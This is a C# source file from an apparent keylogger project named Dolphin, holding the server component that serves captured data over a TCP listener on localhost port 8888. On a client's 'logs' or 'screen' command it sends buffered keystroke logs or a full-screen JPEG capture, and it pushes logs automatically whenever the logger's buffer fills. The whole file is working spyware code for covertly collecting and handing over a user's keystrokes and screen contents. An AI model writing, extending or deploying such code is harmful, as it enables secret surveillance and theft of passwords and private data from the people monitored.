using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Dolphin
{
    static class Server
    {
        private static string DataToSend { get; set; } = "";
        private static bool DataReady { get; set; } = false;

        public static void Run(KeyLogger logger)
        {
            IPAddress localAddress = IPAddress.Parse("127.0.0.1");
            int port = 8888;
            TcpListener listener = new TcpListener(localAddress, port);
            listener.Start();
            logger.IsFull += CopyData;
            byte[] buffer = new byte[255];
            try
            {
                TcpClient client = listener.AcceptTcpClient();
                NetworkStream stream = client.GetStream();
                while (true)
                {
                    if (DataReady)
                    {
                        SendLogs(stream);
                    }

                    if (stream.DataAvailable)
                    {
                        int bytes = stream.Read(buffer, 0, buffer.Length);
                        string command = Encoding.UTF8.GetString(buffer, 0, bytes);
                        if (command == "quit")
                        {
                            break;
                        }
                        if (command == "logs")
                        {
                            CopyData(logger.LogsStream);
                        }
                        else if (command == "screen")
                        {
                            var img = logger.Screenshot();
                            SendScreen(stream, img);
                        }
                    }
                }
                stream.Close();
                client.Close();

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
            finally
            {
                listener.Stop();
            }
        }

        private static void CopyData(StringBuilder stream)
        {
            DataToSend = stream.ToString();
            stream.Clear();
            DataReady = true;
        }

        private static void SendLogs(NetworkStream stream)
        {
            byte[] data = Encoding.UTF8.GetBytes(DataToSend);

            stream.Write(data, 0, data.Length);
            DataReady = false;
            DataToSend = "";
        }
        private static void SendScreen(NetworkStream stream, Bitmap img)
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using var memoryStream = new MemoryStream();
            using var bitmap = new Bitmap(bounds.Width, bounds.Height);
            using (Graphics g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }

            bitmap.Save(memoryStream, ImageFormat.Jpeg);
            byte[] data = memoryStream.ToArray();
            stream.Write(data, 0, data.Length);
        }
    }

}
